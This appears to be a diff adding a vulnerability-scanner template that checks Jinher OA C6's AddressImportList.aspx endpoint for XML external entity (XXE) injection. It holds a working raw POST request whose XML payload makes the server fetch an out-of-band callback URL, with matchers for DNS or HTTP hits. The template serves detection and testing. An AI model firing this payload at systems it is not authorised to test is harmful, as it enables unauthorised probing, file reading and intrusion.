@@ -1,0 +1,41 @@
+id: jinher-oa-c6-AddressImportList-xxe
+info:
+  name: 金和OA AddressImportList.aspx XXE漏洞
+  author: leadlife
+  severity: critical
+  description: 金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 AddressImportList.aspx 接口处存在XXE漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/bwf682gt1a6q2ase
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: demo
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: oob,jinher,xxe
+
+http:
+  - raw:
+      - |
+        POST /c6/Jhsoft.Web.addressbook/AddressImportList.aspx/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 130
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE root [
+        <!ENTITY % remote SYSTEM "http://{{interactsh-url}}">
+        %remote;]>
+        <root/>
+      
+        
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
